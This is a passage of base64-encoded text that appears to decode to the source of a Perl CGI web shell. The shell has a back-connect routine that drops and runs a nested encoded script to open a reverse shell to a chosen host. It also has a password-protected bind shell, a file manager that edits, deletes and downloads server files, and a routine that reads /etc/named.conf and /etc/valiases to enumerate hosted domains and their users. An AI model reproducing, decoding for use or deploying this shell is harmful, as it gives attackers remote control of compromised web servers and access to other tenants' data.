0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQmFja0JpbmRGb3JtDQp7DQoJcmV0dXJuIDw8RU5EOw0KCTxicj48YnI+DQoNCgk8dGFibGU+DQoJPHRyPg0KCTxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KCTx0ZD5CYWNrQ29ubmVjdDogPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImJhY2tiaW5kIj48L3RkPg0KCTx0ZD4gSG9zdDogPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjIwIiBuYW1lPSJjbGllbnRhZGRyIiB2YWx1ZT0iJEVOVnsnUkVNT1RFX0FERFInfSI+DQoJIFBvcnQ6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSI3IiBuYW1lPSJjbGllbnRwb3J0IiB2YWx1ZT0iODAiIG9ua2V5dXA9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdiYScpLmlubmVySFRNTD10aGlzLnZhbHVlOyI+PC90ZD4NCg0KCTx0ZD48aW5wdXQgbmFtZT0icyIgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJDb25uZWN0Ij48L3RkPg0KCTwvZm9ybT4NCgk8L3RyPg0KCTx0cj4NCgk8dGQgY29sc3Bhbj0zPjxmb250IGNvbG9yPSNGRkZGRkY+WytdIENsaWVudCBsaXN0ZW4gYmVmb3JlIGNvbm5lY3QgYmFjayENCgk8YnI+WytdIFRyeSBjaGVjayB5b3VyIFBvcnQgd2l0aCA8YSB0YXJnZXQ9Il9ibGFuayIgaHJlZj0iaHR0cDovL3d3dy5jYW55b3VzZWVtZS5vcmcvIj5odHRwOi8vd3d3LmNhbnlvdXNlZW1lLm9yZy88L2E+DQoJPGJyPlsrXSBDbGllbnQgbGlzdGVuIHdpdGggY29tbWFuZDogPHJ1bj5uYyAtdnYgLWwgLXAgPHNwYW4gaWQ9ImJhIj44MDwvc3Bhbj48L3J1bj48L2ZvbnQ+PC90ZD4NCg0KCTwvdHI+DQoJPC90YWJsZT4NCg0KCTxicj48YnI+DQoJPHRhYmxlPg0KCTx0cj4NCgk8Zm9ybSBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCgk8dGQ+QmluZCBQb3J0OiA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iYmFja2JpbmQiPjwvdGQ+DQoNCgk8dGQ+IFBvcnQ6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSIxNSIgbmFtZT0iY2xpZW50cG9ydCIgdmFsdWU9IjE0MTIiIG9ua2V5dXA9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdiaScpLmlubmVySFRNTD10aGlzLnZhbHVlOyI+DQoNCgkgUGFzc3dvcmQ6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSIxNSIgbmFtZT0iYmluZHBhc3MiIHZhbHVlPSJUSElFVUdJQUJVT04iPjwvdGQ+DQoJPHRkPjxpbnB1dCBuYW1lPSJzIiBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IkJpbmQiPjwvdGQ+DQoJPC9mb3JtPg0KCTwvdHI+DQoJPHRyPg0KCTx0ZCBjb2xzcGFuPTM+PGZvbnQgY29sb3I9I0ZGRkZGRj5bK10gQ2h1YyBuYW5nIGNodWEgZGMgdGVzdCENCgk8YnI+WytdIFRyeSBjb21tYW5kOiA8cnVuPm5jICRFTlZ7J1NFUlZFUl9BRERSJ30gPHNwYW4gaWQ9ImJpIj4xNDEyPC9zcGFuPjwvcnVuPjwvZm9udD48L3RkPg0KDQoJPC90cj4NCgk8L3RhYmxlPjxicj4NCkVORA0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBCYWNrY29ubmVjdCB1c2UgcGVybA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEJhY2tCaW5kDQp7DQoJdXNlIE1JTUU6OkJhc2U2NDsNCgl1c2UgU29ja2V0OwkNCgkkYmFja3Blcmw9Ikl5RXZkWE55TDJKcGJpOXdaWEpzRFFwMWMyVWdTVTg2T2xOdlkydGxkRHNOQ2lSVGFHVnNiQWs5SUNJdlltbHVMMkpoYzJnaU93MEtKRUZTUjBNOVFFRlNSMVk3RFFwMWMyVWdVMjlqYTJWME93MEtkWE5sSUVacGJHVklZVzVrYkdVN0RRcHpiMk5yWlhRb1UwOURTMFZVTENCUVJsOUpUa1ZVTENCVFQwTkxYMU5VVWtWQlRTd2daMlYwY0hKdmRHOWllVzVoYldVb0luUmpjQ0lwS1NCdmNpQmthV1VnY0hKcGJuUWdJbHN0WFNCVmJtRmliR1VnZEc4Z1VtVnpiMngyWlNCSWIzTjBYRzRpT3cwS1kyOXVibVZqZENoVFQwTkxSVlFzSUhOdlkydGhaR1J5WDJsdUtDUkJVa2RXV3pGZExDQnBibVYwWDJGMGIyNG9KRUZTUjFaYk1GMHBLU2tnYjNJZ1pHbGxJSEJ5YVc1MElDSmJMVjBnVlc1aFlteGxJSFJ2SUVOdmJtNWxZM1FnU0c5emRGeHVJanNOQ25CeWFXNTBJQ0pEYjI1dVpXTjBaV1FoSWpzTkNsTlBRMHRGVkMwK1lYVjBiMlpzZFhOb0tDazdEUXB2Y0dWdUtGTlVSRWxPTENBaVBpWlRUME5MUlZRaUtUc05DbTl3Wlc0b1UxUkVUMVZVTENJK0psTlBRMHRGVkNJcE93MEtiM0JsYmloVFZFUkZVbElzSWo0bVUwOURTMFZVSWlrN0RRcHdjbWx1ZENBaUxTMDlQU0JEYjI1dVpXTjBaV1FnUW1GamEyUnZiM0lnUFQwdExTQWdYRzVjYmlJN0RRcHplWE4wWlcwb0luVnVjMlYwSUVoSlUxUkdTVXhGT3lCMWJuTmxkQ0JUUVZaRlNFbFRWQ0E3WldOb2J5QW5XeXRkSUZONWMzUmxiV2x1Wm04NklDYzdJSFZ1WVcxbElDMWhPMlZqYUc4N1pXTm9ieUFuV3l0ZElGVnpaWEpwYm1adk9pQW5PeUJwWkR0bFkyaHZPMlZqYUc4Z0oxc3JYU0JFYVhKbFkzUnZjbms2SUNjN0lIQjNaRHRsWTJodk95QmxZMmh2SUNkYksxMGdVMmhsYkd3NklDYzdKRk5vWld4c0lpazdEUXBqYkc5elpTQlRUME5MUlZRNyI7DQoJJGJpbmRwZXJsPSJJeUV2ZFhOeUwySnBiaTl3WlhKc0RRcDFjMlVnVTI5amEyVjBPdzBLSkVGU1IwTTlRRUZTUjFZN0RRb2tjRzl5ZEFrOUlDUkJVa2RXV3pCZE93MEtKSEJ5YjNSdkNUMGdaMlYwY0hKdmRHOWllVzVoYldVb0ozUmpjQ2NwT3cwS0pGTm9aV3hzQ1QwZ0lpOWlhVzR2WW1GemFDSTdEUXB6YjJOclpYUW9VMFZTVmtWU0xDQlFSbDlKVGtWVUxDQlRUME5MWDFOVVVrVkJUU3dnSkhCeWIzUnZLVzl5SUdScFpTQWljMjlqYTJWME9pUWhJanNOQ25ObGRITnZZMnR2Y0hRb1UwVlNWa1ZTTENCVFQweGZVMDlEUzBWVUxDQlRUMTlTUlZWVFJVRkVSRklzSUhCaFkyc29JbXdpTENBeEtTbHZjaUJrYVdVZ0luTmxkSE52WTJ0dmNIUTZJQ1FoSWpzTkNtSnBibVFvVTBWU1ZrVlNMQ0J6YjJOcllXUmtjbDlwYmlna2NHOXlkQ3dnU1U1QlJFUlNYMEZPV1NrcGIzSWdaR2xsSUNKaWFXNWtPaUFrSVNJN0RRcHNhWE4wWlc0b1UwVlNWa1ZTTENCVFQwMUJXRU5QVGs0cENRbHZjaUJrYVdVZ0lteHBjM1JsYmpvZ0pDRWlPdzBLWm05eUtEc2dKSEJoWkdSeUlEMGdZV05qWlhCMEtFTk1TVVZPVkN3Z1UwVlNWa1ZTS1RzZ1kyeHZjMlVnUTB4SlJVNVVLUTBLZXcwS0NXOXdaVzRvVTFSRVNVNHNJQ0krSmtOTVNVVk9WQ0lwT3cwS0NXOXdaVzRvVTFSRVQxVlVMQ0FpUGlaRFRFbEZUbFFpS1RzTkNnbHZjR1Z1S0ZOVVJFVlNVaXdnSWo0bVEweEpSVTVVSWlrN0RRb0pjM2x6ZEdWdEtDSjFibk5sZENCSVNWTlVSa2xNUlRzZ2RXNXpaWFFnVTBGV1JVaEpVMVFnTzJWamFHOGdKMXNyWFNCVGVYTjBaVzFwYm1adk9pQW5PeUIxYm1GdFpTQXRZVHRsWTJodk8yVmphRzhnSjFzclhTQlZjMlZ5YVc1bWJ6b2dKenNnYVdRN1pXTm9ienRsWTJodklDZGJLMTBnUkdseVpXTjBiM0o1T2lBbk95QndkMlE3WldOb2J6c2daV05vYnlBbld5dGRJRk5vWld4c09pQW5PeVJUYUdWc2JDSXBPdzBLQ1dOc2IzTmxLRk5VUkVsT0tUc05DZ2xqYkc5elpTaFRWRVJQVlZRcE93MEtDV05zYjNObEtGTlVSRVZTVWlrN0RRcDlEUW89IjsNCg0KCSRDbGllbnRBZGRyID0gJGlueydjbGllbnRhZGRyJ307DQoJJENsaWVudFBvcnQgPSBpbnQoJGlueydjbGllbnRwb3J0J30pOw0KCWlmKCRDbGllbnRQb3J0IGVxIDApDQoJew0KCQlyZXR1cm4gJkJhY2tCaW5kRm9ybTsNCgl9ZWxzaWYoISRDbGllbnRBZGRyIGVxICIiKQ0KCXsNCgkJJERhdGE9ZGVjb2RlX2Jhc2U2NCgkYmFja3BlcmwpOw0KCQlpZigtdyAiL3RtcC8iKQ0KCQl7DQoJCQkkRmlsZT0iL3RtcC9iYWNrY29ubmVjdC5wbCI7CQ0KCQl9ZWxzZQ0KCQl7DQoJCQkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4iYmFja2Nvbm5lY3QucGwiOw0KCQl9DQoJCW9wZW4oRklMRSwgIj4kRmlsZSIpOw0KCQlwcmludCBGSUxFICREYXRhOw0KCQljbG9zZSBGSUxFOw0KCQlzeXN0ZW0oInBlcmwgYmFja2Nvbm5lY3QucGwgJENsaWVudEFkZHIgJENsaWVudFBvcnQiKTsNCgkJdW5saW5rKCRGaWxlKTsNCgkJZXhpdCAwOw0KCX1lbHNlDQoJew0KCQkkRGF0YT1kZWNvZGVfYmFzZTY0KCRiaW5kcGVybCk7DQoJCWlmKC13ICIvdG1wIikNCgkJew0KCQkJJEZpbGU9Ii90bXAvYmluZHBvcnQucGwiOwkNCgkJfWVsc2UNCgkJew0KCQkJJEZpbGU9JEN1cnJlbnREaXIuJFBhdGhTZXAuImJpbmRwb3J0LnBsIjsNCgkJfQ0KCQlvcGVuKEZJTEUsICI+JEZpbGUiKTsNCgkJcHJpbnQgRklMRSAkRGF0YTsNCgkJY2xvc2UgRklMRTsNCgkJc3lzdGVtKCJwZXJsIGJpbmRwb3J0LnBsICRDbGllbnRQb3J0Iik7DQoJCXVubGluaygkRmlsZSk7DQoJCWV4aXQgMDsNCgl9DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojICBBcnJheSBMaXN0IERpcmVjdG9yeQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFJtRGlyKCQpIA0Kew0KCW15ICRkaXIgPSBzaGlmdDsNCiAgICBpZihvcGVuZGlyKERJUiwkZGlyKSkNCgl7DQoJCXdoaWxlKCRmaWxlID0gcmVhZGRpcihESVIpKQ0KCQl7DQoJCQlpZigoJGZpbGUgbmUgIi4iKSAmJiAoJGZpbGUgbmUgIi4uIikpDQoJCQl7DQoJCQkJJGZpbGU9ICRkaXIuJFBhdGhTZXAuJGZpbGU7DQoJCQkJaWYoLWQgJGZpbGUpDQoJCQkJew0KCQkJCQkmUm1EaXIoJGZpbGUpOw0KCQkJCX0NCgkJCQllbHNlDQoJCQkJew0KCQkJCQl1bmxpbmsoJGZpbGUpOw0KCQkJCX0NCgkJCX0NCgkJfQ0KCQljbG9zZWRpcihESVIpOw0KCX0NCglpZighcm1kaXIoJGRpcikpDQoJew0KCQkNCgl9DQp9DQpzdWIgRmlsZU93bmVyKCQpDQp7DQoJbXkgJGZpbGUgPSBzaGlmdDsNCglpZigtZSAkZmlsZSkNCgl7DQoJCSgkdWlkLCRnaWQpID0gKHN0YXQoJGZpbGUpKVs0LDVdOw0KCQlpZigkV2luTlQpDQoJCXsNCgkJCXJldHVybiAiPz8/IjsNCgkJfQ0KCQllbHNlDQoJCXsNCgkJCSRuYW1lPWdldHB3dWlkKCR1aWQpOw0KCQkJJGdyb3VwPWdldGdyZ2lkKCRnaWQpOw0KCQkJcmV0dXJuICRuYW1lLiIvIi4kZ3JvdXA7DQoJCX0NCgl9DQoJcmV0dXJuICI/Pz8iOw0KfQ0Kc3ViIFBhcmVudEZvbGRlcigkKQ0Kew0KCW15ICRwYXRoID0gc2hpZnQ7DQoJbXkgJENvbW0gPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiJjZCAuLiIuJENtZFNlcC4kQ21kUHdkOw0KCWNob3AoJHBhdGggPSBgJENvbW1gKTsNCglyZXR1cm4gJHBhdGg7DQp9DQpzdWIgRmlsZVBlcm1zKCQpDQp7DQoJbXkgJGZpbGUgPSBzaGlmdDsNCglteSAkdXIgPSAiLSI7DQoJbXkgJHV3ID0gIi0iOw0KCWlmKC1lICRmaWxlKQ0KCXsNCgkJaWYoJFdpbk5UKQ0KCQl7DQoJCQlpZigtciAkZmlsZSl7ICR1ciA9ICJyIjsgfQ0KCQkJaWYoLXcgJGZpbGUpeyAkdXcgPSAidyI7IH0NCgkJCXJldHVybiAkdXIgLiAiIC8gIiAuICR1dzsNCgkJfWVsc2UNCgkJew0KCQkJJG1vZGU9KHN0YXQoJGZpbGUpKVsyXTsNCgkJCSRyZXN1bHQgPSBzcHJpbnRmKCIlMDRvIiwgJG1vZGUgJiAwNzc3Nyk7DQoJCQlyZXR1cm4gJHJlc3VsdDsNCgkJfQ0KCX0NCglyZXR1cm4gIjAwMDAiOw0KfQ0Kc3ViIEZpbGVMYXN0TW9kaWZpZWQoJCkNCnsNCglteSAkZmlsZSA9IHNoaWZ0Ow0KCWlmKC1lICRmaWxlKQ0KCXsNCgkJKCRsYSkgPSAoc3RhdCgkZmlsZSkpWzldOw0KCQkoJGQsJG0sJHksJGgsJGkpID0gKGxvY2FsdGltZSgkbGEpKVszLDQsNSwyLDFdOw0KCQkkeSA9ICR5ICsgMTkwMDsNCgkJQG1vbnRoID0gcXcvMSAyIDMgNCA1IDYgNyA4IDkgMTAgMTEgMTIvOw0KCQkkbG10aW1lID0gc3ByaW50ZigiJTAyZC8lcy8lNGQgJTAyZDolMDJkIiwkZCwkbW9udGhbJG1dLCR5LCRoLCRpKTsNCgkJcmV0dXJuICRsbXRpbWU7DQoJfQ0KCXJldHVybiAiPz8/IjsNCn0NCnN1YiBGaWxlU2l6ZSgkKQ0Kew0KCW15ICRmaWxlID0gc2hpZnQ7DQoJaWYoLWYgJGZpbGUpDQoJew0KCQlyZXR1cm4gLXMgJGZpbGU7DQoJfQ0KCXJldHVybiAiMCI7DQoNCn0NCnN1YiBQYXJzZUZpbGVTaXplKCQpDQp7DQoJbXkgJHNpemUgPSBzaGlmdDsNCglpZigkc2l6ZSA8PSAxMDI0KQ0KCXsNCgkJcmV0dXJuICRzaXplLiAiIEIiOw0KCX0NCgllbHNlDQoJew0KCQlpZigkc2l6ZSA8PSAxMDI0KjEwMjQpIA0KCQl7DQoJCQkkc2l6ZSA9IHNwcmludGYoIiUuMDJmIiwkc2l6ZSAvIDEwMjQpOw0KCQkJcmV0dXJuICRzaXplLiIgS0IiOw0KCQl9DQoJCWVsc2UgDQoJCXsNCgkJCSRzaXplID0gc3ByaW50ZigiJS4yZiIsJHNpemUgLyAxMDI0IC8gMTAyNCk7DQoJCQlyZXR1cm4gJHNpemUuIiBNQiI7DQoJCX0NCgl9DQp9DQpzdWIgdHJpbSgkKQ0Kew0KCW15ICRzdHJpbmcgPSBzaGlmdDsNCgkkc3RyaW5nID1+IHMvXlxzKy8vOw0KCSRzdHJpbmcgPX4gcy9ccyskLy87DQoJcmV0dXJuICRzdHJpbmc7DQp9DQpzdWIgQWRkU2xhc2hlcygkKQ0Kew0KCW15ICRzdHJpbmcgPSBzaGlmdDsNCgkkc3RyaW5nPX4gcy9cXC9cXFxcL2c7DQoJcmV0dXJuICRzdHJpbmc7DQp9DQpzdWIgTGlzdERpcg0Kew0KCW15ICRwYXRoID0gJEN1cnJlbnREaXIuJFBhdGhTZXA7DQoJJHBhdGg9fiBzL1xcXFwvXFwvZzsNCglteSAkcmVzdWx0ID0gIjxmb3JtIG5hbWU9J2YnIGFjdGlvbj0nJFNjcmlwdExvY2F0aW9uJz48c3BhbiBzdHlsZT0nZm9udDogMTFwdCBWZXJkYW5hOyBmb250LXdlaWdodDogYm9sZDsnPlBhdGg6IFsgIi4mQWRkTGlua0RpcigiZ3VpIikuIiBdIDwvc3Bhbj48aW5wdXQgdHlwZT0ndGV4dCcgbmFtZT0nZCcgc2l6ZT0nNDAnIHZhbHVlPSckQ3VycmVudERpcicgLz48aW5wdXQgdHlwZT0naGlkZGVuJyBuYW1lPSdhJyB2YWx1ZT0nZ3VpJz48aW5wdXQgY2xhc3M9J3N1Ym1pdCcgdHlwZT0nc3VibWl0JyB2YWx1ZT0nQ2hhbmdlJz48L2Zvcm0+IjsNCglpZigtZCAkcGF0aCkNCgl7DQoJCW15IEBmbmFtZSA9ICgpOw0KCQlteSBAZG5hbWUgPSAoKTsNCgkJaWYob3BlbmRpcihESVIsJHBhdGgpKQ0KCQl7DQoJCQl3aGlsZSgkZmlsZSA9IHJlYWRkaXIoRElSKSkNCgkJCXsNCgkJCQkkZj0kcGF0aC4kZmlsZTsNCgkJCQlpZigtZCAkZikNCgkJCQl7DQoJCQkJCXB1c2goQGRuYW1lLCRmaWxlKTsNCgkJCQl9DQoJCQkJZWxzZQ0KCQkJCXsNCgkJCQkJcHVzaChAZm5hbWUsJGZpbGUpOw0KCQkJCX0NCgkJCX0NCgkJCWNsb3NlZGlyKERJUik7DQoJCX0NCgkJQGZuYW1lID0gc29ydCB7IGxjKCRhKSBjbXAgbGMoJGIpIH0gQGZuYW1lOw0KCQlAZG5hbWUgPSBzb3J0IHsgbGMoJGEpIGNtcCBsYygkYikgfSBAZG5hbWU7DQoJCSRyZXN1bHQgLj0gIjxkaXY+PHRhYmxlIHdpZHRoPSc5MCUnIGNsYXNzPSdsaXN0ZGlyJz4NCg0KCQk8dHIgc3R5bGU9J2JhY2tncm91bmQtY29sb3I6ICMzZTNlM2UnPjx0aD5GaWxlIE5hbWU8L3RoPg0KCQk8dGggc3R5bGU9J3dpZHRoOjEwMHB4Oyc+RmlsZSBTaXplPC90aD4NCgkJPHRoIHN0eWxlPSd3aWR0aDoxNTBweDsnPk93bmVyPC90aD4NCgkJPHRoIHN0eWxlPSd3aWR0aDoxMDBweDsnPlBlcm1pc3Npb248L3RoPg0KCQk8dGggc3R5bGU9J3dpZHRoOjE1MHB4Oyc+TGFzdCBNb2RpZmllZDwvdGg+DQoJCTx0aCBzdHlsZT0nd2lkdGg6MjYwcHg7Jz5BY3Rpb248L3RoPjwvdHI+IjsNCgkJbXkgJHN0eWxlPSJsaW5lIjsNCgkJbXkgJGk9MDsNCgkJZm9yZWFjaCBteSAkZCAoQGRuYW1lKQ0KCQl7DQoJCQkkc3R5bGU9ICgkc3R5bGUgZXEgImxpbmUiKSA/ICJub3RsaW5lIjogImxpbmUiOw0KCQkJJGQgPSAmdHJpbSgkZCk7DQoJCQkkZGlybmFtZT0kZDsNCgkJCWlmKCRkIGVxICIuLiIpIA0KCQkJew0KCQkJCSRkID0gJlBhcmVudEZvbGRlcigkcGF0aCk7DQoJCQl9DQoJCQllbHNpZigkZCBlcSAiLiIpIA0KCQkJew0KCQkJCSRkID0gJHBhdGg7DQoJCQl9DQoJCQllbHNlIA0KCQkJew0KCQkJCSRkID0gJHBhdGguJGQ7DQoJCQl9DQoJCQkkcmVzdWx0IC49ICI8dHIgY2xhc3M9JyRzdHlsZSc+DQoNCgkJCTx0ZCBpZD0nRmlsZV8kaScgc3R5bGU9J2ZvbnQ6IDExcHQgVmVyZGFuYTsgZm9udC13ZWlnaHQ6IGJvbGQ7Jz48YSAgaHJlZj0nP2E9Z3VpJmQ9Ii4kZC4iJz5bICIuJGRpcm5hbWUuIiBdPC9hPjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZD5ESVI8L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyOyc+Ii4mRmlsZU93bmVyKCRkKS4iPC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkIGlkPSdGaWxlUGVybXNfJGknIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnIG9uZGJsY2xpY2s9XCJybV9jaG1vZF9mb3JtKHRoaXMsIi4kaS4iLCciLiZGaWxlUGVybXMoJGQpLiInLCciLiRkaXJuYW1lLiInKVwiID48c3BhbiBvbmNsaWNrPVwiY2htb2RfZm9ybSgiLiRpLiIsJyIuJGRpcm5hbWUuIicpXCIgPiIuJkZpbGVQZXJtcygkZCkuIjwvc3Bhbj48L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyOyc+Ii4mRmlsZUxhc3RNb2RpZmllZCgkZCkuIjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7Jz48YSBocmVmPSdqYXZhc2NyaXB0OnJldHVybiBmYWxzZTsnIG9uY2xpY2s9XCJyZW5hbWVfZm9ybSgkaSwnJGRpcm5hbWUnLCciLiZBZGRTbGFzaGVzKCZBZGRTbGFzaGVzKCRkKSkuIicpXCI+UmVuYW1lPC9hPiAgfCA8YSBvbmNsaWNrPVwiaWYoIWNvbmZpcm0oJ1JlbW92ZSBkaXI6ICRkaXJuYW1lID8nKSkgeyByZXR1cm4gZmFsc2U7fVwiIGhyZWY9Jz9hPWd1aSZkPSRwYXRoJnJlbW92ZT0kZGlybmFtZSc+UmVtb3ZlPC9hPjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjwvdHI+IjsNCgkJCSRpKys7DQoJCX0NCgkJZm9yZWFjaCBteSAkZiAoQGZuYW1lKQ0KCQl7DQoJCQkkc3R5bGU9ICgkc3R5bGUgZXEgImxpbmUiKSA/ICJub3RsaW5lIjogImxpbmUiOw0KCQkJJGZpbGU9JGY7DQoJCQkkZiA9ICRwYXRoLiRmOw0KCQkJJHZpZXcgPSAiP2Rpcj0iLiRwYXRoLiImdmlldz0iLiRmOw0KCQkJJHJlc3VsdCAuPSAiPHRyIGNsYXNzPSckc3R5bGUnPjx0ZCBpZD0nRmlsZV8kaScgc3R5bGU9J2ZvbnQ6IDExcHQgVmVyZGFuYTsnPjxhIGhyZWY9Jz9hPWNvbW1hbmQmZD0iLiRwYXRoLiImYz1lZGl0JTIwIi4kZmlsZS4iJz4iLiRmaWxlLiI8L2E+PC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkPiIuJlBhcnNlRmlsZVNpemUoJkZpbGVTaXplKCRmKSkuIjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7Jz4iLiZGaWxlT3duZXIoJGYpLiI8L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQgaWQ9J0ZpbGVQZXJtc18kaScgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyOycgb25kYmxjbGljaz1cInJtX2NobW9kX2Zvcm0odGhpcywiLiRpLiIsJyIuJkZpbGVQZXJtcygkZikuIicsJyIuJGZpbGUuIicpXCIgPjxzcGFuIG9uY2xpY2s9XCJjaG1vZF9mb3JtKCRpLCckZmlsZScpXCIgPiIuJkZpbGVQZXJtcygkZikuIjwvc3Bhbj48L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyOyc+Ii4mRmlsZUxhc3RNb2RpZmllZCgkZikuIjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7Jz48YSBocmVmPSc/YT1jb21tYW5kJmQ9Ii4kcGF0aC4iJmM9ZWRpdCUyMCIuJGZpbGUuIic+RWRpdDwvYT4gfCA8YSBocmVmPSdqYXZhc2NyaXB0OnJldHVybiBmYWxzZTsnIG9uY2xpY2s9XCJyZW5hbWVfZm9ybSgkaSwnJGZpbGUnLCdmJylcIj5SZW5hbWU8L2E+IHwgPGEgaHJlZj0nP2E9ZG93bmxvYWQmbz1nbyZmPSIuJGYuIic+RG93bmxvYWQ8L2E+IHwgPGEgb25jbGljaz1cImlmKCFjb25maXJtKCdSZW1vdmUgZmlsZTogJGZpbGUgPycpKSB7IHJldHVybiBmYWxzZTt9XCIgaHJlZj0nP2E9Z3VpJmQ9JHBhdGgmcmVtb3ZlPSRmaWxlJz5SZW1vdmU8L2E+PC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPC90cj4iOw0KCQkJJGkrKzsNCgkJfQ0KCQkkcmVzdWx0IC49ICI8L3RhYmxlPjwvZGl2PiI7DQoJfQ0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUcnkgdG8gVmlldyBMaXN0IFVzZXINCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBWaWV3RG9tYWluVXNlcg0Kew0KCW9wZW4gKGRvbWFpbnMsICcvZXRjL25hbWVkLmNvbmYnKSBvciAkZXJyPTE7DQoJbXkgQGNuenMgPSA8ZG9tYWlucz47DQoJY2xvc2UgZDBtYWluczsNCglteSAkc3R5bGU9ImxpbmUiOw0KCW15ICRyZXN1bHQ9IjxoNT48Zm9udCBzdHlsZT0nZm9udDogMTVwdCBWZXJkYW5hO2NvbG9yOiAjZmY5OTAwOyc+SG9hbmcgU2EgLSBUcnVvbmcgU2E8L2ZvbnQ+PC9oNT4iOw0KCWlmICgkZXJyKQ0KCXsNCgkJJHJlc3VsdCAuPSAgKCc8cD5DMHVsZG5cJ3QgQnlwYXNzIGl0ICwgU29ycnk8L3A+Jyk7DQoJCXJldHVybiAkcmVzdWx0Ow0KCX1lbHNlDQoJew0KCQkkcmVzdWx0IC49ICc8dGFibGU+PHRyPjx0aD5Eb21haW5zPC90aD4gPHRoPlVzZXI8L3RoPjwvdHI+JzsNCgl9DQoJZm9yZWFjaCBteSAkb25lIChAY256cykNCgl7DQoJCWlmKCRvbmUgPX4gbS8uKj96b25lICIoLio/KSIgey8pDQoJCXsJDQoJCQkkc3R5bGU9ICgkc3R5bGUgZXEgImxpbmUiKSA/ICJub3RsaW5lIjogImxpbmUiOw0KCQkJJGZpbGVuYW1lPSAiL2V0Yy92YWxpYXNlcy8iLiRvbmU7DQoJCQkkb3duZXIgPSBnZXRwd3VpZCgoc3RhdCgkZmlsZW5hbWUpKVs0XSk7DQoJCQkkcmVzdWx0IC49ICc8dHIgY2xhc3M9IiRzdHlsZSIgd2lkdGg9NTAlPjx0ZD4nLiRvbmUuJyA8L3RkPjx0ZD4gJy4kb3duZXIuJzwvdGQ+PC90cj4nOw0KCQl9DQoJfQ0KCSRyZXN1bHQgLj0gJzwvdGFibGU+JzsNCglyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVmlldyBMb2cNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBWaWV3TG9nDQp7DQoJaWYoJFdpbk5UKQ0KCXsNCgkJcmV0dXJuICI8aDI+PGZvbnQgc3R5bGU9J2ZvbnQ6IDIwcHQgVmVyZGFuYTtjb2xvcjogI2ZmOTkwMDsnPkRvbid0IHJ1biBvbiBXaW5kb3dzPC9mb250PjwvaDI+IjsNCgl9DQoJbXkgJHJlc3VsdD0iPHRhYmxlPjx0